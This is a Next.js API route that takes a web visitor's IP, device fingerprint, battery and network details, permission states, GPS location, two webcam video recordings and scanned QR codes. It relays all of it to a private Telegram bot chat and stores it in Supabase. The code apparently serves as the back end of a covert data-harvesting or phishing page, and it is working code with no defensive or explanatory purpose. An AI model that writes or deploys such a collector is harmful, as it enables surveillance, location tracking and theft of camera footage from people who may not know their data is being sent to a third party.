import { NextRequest, NextResponse } from "next/server";
import { supabase } from "@/lib/supabase"; // Импортируем клиент Supabase

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Enum для типов сообщений, должен совпадать с фронтендом
enum MessageType {
  InitialSummary = "initial_summary",
  Video1 = "video1",
  Video2 = "video2",
  QrCode = "qr_code",
}

export async function POST(req: NextRequest) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error("Telegram bot token or chat ID is not set in environment variables.");
    return NextResponse.json(
      { error: "Telegram bot token or chat ID is not configured. Please check your .env.local file." },
      { status: 500 }
    );
  }

  try {
    const {
      messageType,
      sessionId,
      timestamp,
      attempt,
      clientInfo,
      networkInfo,
      deviceMemory,
      batteryInfo,
      geolocation,
      video1,
      video2,
      qrCodeData,
      permissionStatus,
    } = await req.json();

    const ipAddressHeader = req.headers.get("x-forwarded-for");
    const ipAddress = ipAddressHeader ? ipAddressHeader.split(',').map(ip => ip.trim()).join(', ') : "Unavailable";
    
    const telegramPromises: Promise<Response>[] = [];
    const supabasePromises: Promise<any>[] = []; // Для операций Supabase

    const sessionPrefix = sessionId ? `[Сессия: \`${sessionId}\`]\n` : "";
    const formattedTimestamp = timestamp ? new Date(timestamp).toLocaleString('ru-RU') : "Неизвестно";
    const attemptSuffix = attempt && attempt > 1 ? ` (Попытка ${attempt})` : "";

    switch (messageType) {
      case MessageType.InitialSummary:
        let summaryText = `${sessionPrefix}📊 *Отчет о сессии*\n\n`;
        if (timestamp) {
          summaryText += `*Время сессии:* ${formattedTimestamp}\n`;
        }
        summaryText += "\n--- 📱 *Информация об устройстве* ---\n";
        if (ipAddress && ipAddress !== "Unavailable") {
          summaryText += `*IP:* \`${ipAddress}\`\n`;
        }
        if (clientInfo?.platform) {
          summaryText += `*Платформа:* ${clientInfo.platform}\n`;
        }
        if (clientInfo?.hardwareConcurrency) {
          summaryText += `*Ядра CPU:* ${clientInfo.hardwareConcurrency}\n`;
        }
        if (deviceMemory !== undefined && deviceMemory !== null) {
          summaryText += `*Память устройства:* ${deviceMemory} GB\n`;
        }
        if (clientInfo?.screenWidth && clientInfo.screenHeight) {
          summaryText += `*Разрешение экрана:* ${clientInfo.screenWidth}x${clientInfo.screenHeight}\n`;
        }
        if (clientInfo?.browserLanguage) {
          summaryText += `*Язык браузера:* ${clientInfo.browserLanguage}\n`;
        }
        if (batteryInfo?.status && batteryInfo.status !== "Not Supported" && batteryInfo.status !== "Error") {
          if (batteryInfo.level !== undefined) {
            summaryText += `*Батарея:* ${(batteryInfo.level * 100).toFixed(0)}% (${batteryInfo?.charging !== undefined ? (batteryInfo.charging ? "Заряжается" : "Не заряжается") : "Неизвестно"}) [Статус API: ${batteryInfo?.status || "Неизвестно"}]\n`;
          } else {
            summaryText += `*Батарея:* ${batteryInfo.status}\n`;
          }
        }

        summaryText += "\n--- 🌐 *Информация о сети* ---\n";
        if (networkInfo?.effectiveType) {
          summaryText += `*Тип соединения:* ${networkInfo.effectiveType}\n`;
        }
        if (networkInfo?.rtt !== undefined && networkInfo.rtt !== null) {
          summaryText += `*RTT:* ${networkInfo.rtt} ms\n`;
        }
        if (networkInfo?.downlink !== undefined && networkInfo.downlink !== null) {
          summaryText += `*Downlink:* ${networkInfo.downlink} Mbps\n`;
        }

        summaryText += "\n--- ✅ *Статус разрешений* ---\n";
        if (permissionStatus?.geolocation && permissionStatus.geolocation !== "Unknown") {
          summaryText += `*Геолокация:* ${permissionStatus.geolocation}\n`;
        }
        if (permissionStatus?.camera && permissionStatus.camera !== "Unknown") {
          summaryText += `*Камера:* ${permissionStatus.camera}\n`;
        }
        if (permissionStatus?.microphone && permissionStatus.microphone !== "Unknown") {
          summaryText += `*Микрофон:* ${permissionStatus.microphone}\n`;
        }

        telegramPromises.push(
          fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: summaryText, parse_mode: "Markdown" }),
          }).then(async res => {
            console.log("Summary message API response status:", res.status);
            if (!res.ok) { const errorBody = await res.text(); console.error("Summary message API error response:", errorBody); }
            return res;
          })
        );

        if (geolocation?.latitude && geolocation?.longitude) {
          console.log("Attempting to send location...");
          telegramPromises.push(
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, latitude: geolocation.latitude, longitude: geolocation.longitude }),
            }).then(async res => {
              console.log("Location API response status:", res.status);
              if (!res.ok) { const errorBody = await res.text(); console.error("Location API error response:", errorBody); }
              return res;
            })
          );
        }

        // Supabase: Save initial session data
        supabasePromises.push(
          supabase.from('sessions').insert({
            session_id: sessionId,
            timestamp: new Date(timestamp).toISOString(),
            ip_address: ipAddress,
            client_info: clientInfo,
            network_info: networkInfo,
            device_memory: deviceMemory,
            battery_info: batteryInfo,
            permission_status: permissionStatus,
            geolocation: geolocation,
          }).then(({ data, error }) => {
            if (error) {
              console.error("Supabase: Error saving initial summary:", error);
            } else {
              console.log("Supabase: Initial summary saved successfully.");
            }
          })
        );
        break;

      case MessageType.Video1:
      case MessageType.Video2:
        const videoData = messageType === MessageType.Video1 ? video1 : video2;
        if (videoData) {
          console.log(`Attempting to send ${messageType}...`);
          const base64Data = videoData.replace(/^data:video\/\w+;base64,/, "");
          const buffer = Buffer.from(base64Data, "base64");
          const fileName = `${messageType}_${sessionId}_attempt${attempt}.webm`;
          const storagePath = `videos/${sessionId}/${fileName}`;

          const formData = new FormData();
          formData.append("chat_id", TELEGRAM_CHAT_ID);
          formData.append("video", new Blob([buffer], { type: "video/webm" }), fileName);
          formData.append("caption", `${sessionPrefix}🎥 *${messageType === MessageType.Video1 ? "Видео 1" : "Видео 2"}*${attemptSuffix} (Время: ${formattedTimestamp})`);

          telegramPromises.push(
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
              method: "POST",
              body: formData,
            }).then(async res => {
              console.log(`${messageType} API response status:`, res.status);
              if (!res.ok) { const errorBody = await res.text(); console.error(`${messageType} API error response:`, errorBody); }
              return res;
            })
          );

          // Supabase: Upload video to storage and save path to DB
          supabasePromises.push(
            supabase.storage.from('videos').upload(storagePath, buffer, {
              contentType: 'video/webm',
              upsert: true, // Overwrite if exists
            }).then(async ({ data: storageData, error: storageError }) => {
              if (storageError) {
                console.error(`Supabase: Error uploading ${messageType} to storage:`, storageError);
              } else {
                console.log(`Supabase: ${messageType} uploaded to storage successfully.`);
                // Get public URL if needed, or just store the path
                // const { data: publicUrlData } = supabase.storage.from('videos').getPublicUrl(storagePath);
                // const publicUrl = publicUrlData?.publicUrl;

                await supabase.from('videos').insert({
                  session_id: sessionId,
                  video_type: messageType,
                  attempt: attempt,
                  timestamp: new Date(timestamp).toISOString(),
                  storage_path: storagePath,
                }).then(({ data, error }) => {
                  if (error) {
                    console.error(`Supabase: Error saving ${messageType} record to DB:`, error);
                  } else {
                    console.log(`Supabase: ${messageType} record saved to DB successfully.`);
                  }
                });
              }
            })
          );
        }
        break;

      case MessageType.QrCode:
        let qrMessage = `${sessionPrefix}--- 📸 *QR-код*${attemptSuffix} ---\n`;
        if (qrCodeData) {
          if (qrCodeData === "QR Scan Timed Out") {
            qrMessage += `*QR-код:* Սկանավորման ժամանակը սպառվեց ⏳ (Время: ${formattedTimestamp})\n`;
          } else if (qrCodeData.startsWith("QR Scan Error:")) {
            qrMessage += `*QR-код:* Սկանավորման սխալ ❌ (${qrCodeData.replace("QR Scan Error: ", "")}) (Время: ${formattedTimestamp})\n`;
          } else {
            qrMessage += `*QR-կոդը սկանավորված է:* Այո ✅ (\`${qrCodeData}\`) (Время: ${formattedTimestamp})\n`;
          }
        } else {
          qrMessage += `*QR-կոդը սկանավորված է:* Ոչ ❌ (Время: ${formattedTimestamp})\n`;
        }

        telegramPromises.push(
          fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: qrMessage, parse_mode: "Markdown" }),
          }).then(async res => {
            console.log("QR Code message API response status:", res.status);
            if (!res.ok) { const errorBody = await res.text(); console.error("QR Code message API error response:", errorBody); }
            return res;
          })
        );

        // Supabase: Save QR code data
        supabasePromises.push(
          supabase.from('qr_codes').insert({
            session_id: sessionId,
            attempt: attempt,
            timestamp: new Date(timestamp).toISOString(),
            qr_code_data: qrCodeData,
          }).then(({ data, error }) => {
            if (error) {
              console.error("Supabase: Error saving QR code data:", error);
            } else {
              console.log("Supabase: QR code data saved successfully.");
            }
          })
        );
        break;

      default:
        console.warn("Unknown messageType received:", messageType);
        return NextResponse.json({ error: "Unknown message type" }, { status: 400 });
    }

    // Выполняем все промисы параллельно, но независимо
    const allResults = await Promise.allSettled([...telegramPromises, ...supabasePromises]);

    // Логируем результаты для отладки, но не влияем на ответ пользователю
    allResults.forEach((result, index) => {
      if (result.status === 'rejected') {
        console.error(`Promise ${index} failed:`, result.reason);
      }
    });

    return NextResponse.json({ message: "Data processed and sent to Telegram and Supabase." });
  } catch (error: any) {
    console.error("Error processing Telegram/Supabase request:", error);
    return NextResponse.json({ error: error.message || "Internal server error" }, { status: 500 });
  }
}